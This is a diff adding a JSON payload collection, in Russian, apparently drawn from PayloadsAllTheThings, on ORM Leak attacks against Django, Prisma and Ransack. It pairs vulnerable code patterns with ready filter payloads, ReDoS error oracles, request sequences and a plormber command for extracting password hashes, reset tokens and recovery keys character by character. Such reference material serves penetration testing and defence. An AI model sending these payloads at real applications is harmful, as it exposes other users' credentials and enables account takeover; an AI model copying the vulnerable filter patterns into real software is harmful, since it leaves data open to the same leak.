@@ -1,0 +1,185 @@
+{
+  "category": "ORM Leak",
+  "source": "PayloadsAllTheThings/ORM Leak/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Что такое ORM Leak",
+      "language": "text",
+      "tags": ["methodology", "orm", "leak"],
+      "body": "ORM Leak — утечка чувствительных данных (структура БД, поля других пользователей: пароли, хэши, токены сброса), возникающая из-за небезопасной передачи пользовательского ввода в ORM-запросы.\nТипичный корень проблемы: приложение принимает фильтр/параметры из запроса и напрямую разворачивает их в filter/where ORM, давая атакующему контроль над колонкой и оператором сравнения.\nДаже если поле не возвращается в ответе, его значение эксфильтруют посимвольно: подбираешь префикс через __startswith / startsWith / *_start, по реакции (есть результаты / нет) восстанавливаешь значение целиком."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Где искать ORM Leak",
+      "language": "text",
+      "tags": ["methodology", "recon"],
+      "body": "• Эндпоинты, где фильтр приходит из тела/квери и попадает прямо в ORM (filter(**request.data), where: req.query.filter, q[...] у Ransack).\n• Поиск/листинги с произвольными параметрами фильтрации (?filter[...], ?q[...]).\n• Параметры с двойным подчёркиванием (Django: field__lookup) или вложенными объектами (Prisma: {field:{startsWith:...}}).\n• Связанные модели: фильтры по relational-полям (created_by__user__password) позволяют дотянуться до чужих записей.\n• Цели для эксфильтрации: password / password hash, reset_password_token / resetToken, recoveries_key, любые секреты в соседних таблицах."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Каналы эксфильтрации (как восстанавливать значение)",
+      "language": "text",
+      "tags": ["methodology", "blind", "exfiltration"],
+      "body": "Boolean-based  фильтр по префиксу: есть результаты в ответе = символ угадан, пусто = нет. Перебираешь алфавит по позициям.\nTime-based     условная задержка через тяжёлый regex/contains; угаданный префикс → таймаут. Для слепых случаев без видимой разницы в ответе.\nError-based    кривой regex (ReDOS) валит запрос в 500 при совпадении условия — да/нет по факту ошибки.\nАлгоритм: фиксируешь известный префикс, перебираешь следующий символ из набора (напр. hex 0123456789abcdef для токенов/хэшей), повторяешь до конца строки."
+    },
+    {
+      "subcategory": "Django (Python)",
+      "title": "Уязвимый паттерн — filter(**request.data)",
+      "language": "python",
+      "tags": ["django", "python", "orm"],
+      "body": "users = User.objects.filter(**request.data)\nserializer = UserSerializer(users, many=True)"
+    },
+    {
+      "subcategory": "Django (Python)",
+      "title": "Django — заметка по уязвимости",
+      "language": "text",
+      "tags": ["django", "methodology"],
+      "body": "Проблема в том, как Django ORM строит QuerySet через keyword-аргументы. Оператор распаковки (**) даёт пользователю контроль над именами keyword-аргументов filter() — а значит над колонкой и lookup-оператором."
+    },
+    {
+      "subcategory": "Django (Python)",
+      "title": "Query filter — фильтр по чужой колонке",
+      "language": "json",
+      "tags": ["django", "query-filter", "exfiltration"],
+      "body": "{\n  \"username\": \"admin\",\n  \"password__startswith\": \"p\"\n}"
+    },
+    {
+      "subcategory": "Django (Python)",
+      "title": "Полезные lookup-операторы Django",
+      "language": "text",
+      "tags": ["django", "query-filter"],
+      "body": "ORM даёт операторы для частичного совпадения значения: SQL LIKE, regex по пользовательскому шаблону, сравнения < и >.\nИнтересные фильтры:\n* __startswith\n* __contains\n* __regex"
+    },
+    {
+      "subcategory": "Django (Python)",
+      "title": "Relational Filtering — типы связей",
+      "language": "text",
+      "tags": ["django", "relational", "methodology"],
+      "body": "Через relational-фильтры можно дотянуться до полей связанных моделей (в т.ч. чужих пользователей). Пример моделей из разбора Alex Brown (elttam, «plORMbing your Django ORM»).\nДва типа связей:\n* One-to-One\n* Many-to-Many"
+    },
+    {
+      "subcategory": "Django (Python)",
+      "title": "Relational — One-to-One (утечка пароля автора статьи)",
+      "language": "json",
+      "tags": ["django", "relational", "one-to-one"],
+      "body": "{\n  \"created_by__user__password__contains\": \"p\"\n}"
+    },
+    {
+      "subcategory": "Django (Python)",
+      "title": "Relational — Many-to-Many (цепочка фильтров)",
+      "language": "text",
+      "tags": ["django", "relational", "many-to-many"],
+      "body": "Почти то же самое, но фильтровать нужно глубже.\n* Получить ID пользователей: created_by__departments__employees__user__id\n* Для каждого ID получить username:  created_by__departments__employees__user__username\n* Наконец, слить хэш пароля:          created_by__departments__employees__user__password"
+    },
+    {
+      "subcategory": "Django (Python)",
+      "title": "Relational — Many-to-Many (несколько фильтров в одном запросе)",
+      "language": "json",
+      "tags": ["django", "relational", "many-to-many"],
+      "body": "{\n  \"created_by__departments__employees__user__username__startswith\": \"p\",\n  \"created_by__departments__employees__user__id\": 1\n}"
+    },
+    {
+      "subcategory": "Django (Python)",
+      "title": "Error-based leaking — ReDOS (MySQL)",
+      "language": "json",
+      "tags": ["django", "error-based", "redos"],
+      "body": "{\"created_by__user__password__regex\": \"^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$\"}\n// => Return something\n\n{\"created_by__user__password__regex\": \"^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$\"}  \n// => Error 500 (Timeout exceeded in regular expression match)"
+    },
+    {
+      "subcategory": "Django (Python)",
+      "title": "ReDOS — заметка",
+      "language": "text",
+      "tags": ["django", "error-based", "redos"],
+      "body": "Если Django работает с MySQL, можно злоупотребить ReDOS: когда фильтр не совпадает с условием, тяжёлый regex валит запрос в ошибку (таймаут). Разница «есть ответ / 500» даёт булев оракул для посимвольной эксфильтрации."
+    },
+    {
+      "subcategory": "Prisma (Node.JS)",
+      "title": "Уязвимый паттерн — where: req.query.filter",
+      "language": "javascript",
+      "tags": ["prisma", "nodejs", "orm"],
+      "body": "const posts = await prisma.article.findMany({\n  where: req.query.filter as any // Vulnerable to ORM Leaks\n})"
+    },
+    {
+      "subcategory": "Prisma (Node.JS)",
+      "title": "Prisma — include всех полей связанной записи",
+      "language": "json",
+      "tags": ["prisma", "include", "exfiltration"],
+      "body": "{\n  \"filter\": {\n    \"include\": {\n      \"createdBy\": true\n    }\n  }\n}"
+    },
+    {
+      "subcategory": "Prisma (Node.JS)",
+      "title": "Prisma — select конкретного поля (password)",
+      "language": "json",
+      "tags": ["prisma", "select", "exfiltration"],
+      "body": "{\n  \"filter\": {\n    \"select\": {\n      \"createdBy\": {\n        \"select\": {\n          \"password\": true\n        }\n      }\n    }\n  }\n}"
+    },
+    {
+      "subcategory": "Prisma (Node.JS)",
+      "title": "Relational — One-to-One (query-string)",
+      "language": "http",
+      "tags": ["prisma", "relational", "one-to-one"],
+      "body": "filter[createdBy][resetToken][startsWith]=06"
+    },
+    {
+      "subcategory": "Prisma (Node.JS)",
+      "title": "Relational — Many-to-Many (вложенный some)",
+      "language": "json",
+      "tags": ["prisma", "relational", "many-to-many"],
+      "body": "{\n  \"query\": {\n    \"createdBy\": {\n      \"departments\": {\n        \"some\": {\n          \"employees\": {\n            \"some\": {\n              \"departments\": {\n                \"some\": {\n                  \"employees\": {\n                    \"some\": {\n                      \"departments\": {\n                        \"some\": {\n                          \"employees\": {\n                            \"some\": {\n                              \"{fieldToLeak}\": {\n                                \"startsWith\": \"{testStartsWith}\"\n                              }\n                            }\n                          }\n                        }\n                      }\n                    }\n                  }\n                }\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}"
+    },
+    {
+      "subcategory": "Ransack (Ruby)",
+      "title": "Ransack — условие применимости",
+      "language": "text",
+      "tags": ["ransack", "ruby", "methodology"],
+      "body": "Уязвимо только в Ransack < 4.0.0.\nЭксфильтрация идёт через предикаты в параметрах q[...]: *_start (начинается с), *_cont (содержит). По наличию/отсутствию результатов на странице подбираешь значение посимвольно."
+    },
+    {
+      "subcategory": "Ransack (Ruby)",
+      "title": "Ransack — извлечение reset_password_token",
+      "language": "http",
+      "tags": ["ransack", "ruby", "exfiltration"],
+      "body": "GET /posts?q[user_reset_password_token_start]=0 -> Empty results page\nGET /posts?q[user_reset_password_token_start]=1 -> Empty results page\nGET /posts?q[user_reset_password_token_start]=2 -> Results in page\n\nGET /posts?q[user_reset_password_token_start]=2c -> Empty results page\nGET /posts?q[user_reset_password_token_start]=2f -> Results in page"
+    },
+    {
+      "subcategory": "Ransack (Ruby)",
+      "title": "Ransack — таргет конкретного юзера + recoveries_key",
+      "language": "http",
+      "tags": ["ransack", "ruby", "exfiltration"],
+      "body": "GET /labs?q[creator_roles_name_cont]=​superadmin​​&q[creator_recoveries_key_start]=0"
+    },
+    {
+      "subcategory": "Тулзы",
+      "title": "plormber (Prisma, time-based)",
+      "language": "text",
+      "tags": ["tools", "prisma", "time-based"],
+      "body": "elttam/plormber — тулза для эксплуатации time-based ORM Leak. https://github.com/elttam/plormber"
+    },
+    {
+      "subcategory": "Тулзы",
+      "title": "plormber — пример запуска (prisma-contains)",
+      "language": "text",
+      "tags": ["tools", "prisma", "time-based"],
+      "body": "plormber prisma-contains \\\n    --chars '0123456789abcdef' \\\n    --base-query-json '{\"query\": {PAYLOAD}}' \\\n    --leak-query-json '{\"createdBy\": {\"resetToken\": {\"startsWith\": \"{ORM_LEAK}\"}}}' \\\n    --contains-payload-json '{\"body\": {\"contains\": \"{RANDOM_STRING}\"}}' \\\n    --verbose-stats \\\n    https://some.vuln.app/articles/time-based;"
+    },
+    {
+      "subcategory": "CVE",
+      "title": "Известные CVE с ORM Leak",
+      "language": "table",
+      "tags": ["cve", "reference"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["CVE", "Продукт"],
+          "rows": [
+            ["CVE-2023-47117", "Label Studio ORM Leak"],
+            ["CVE-2023-31133", "Ghost CMS ORM Leak"],
+            ["CVE-2023-30843", "Payload CMS ORM Leak"]
+          ]
+        }
+      }
+    }
+  ]
+}
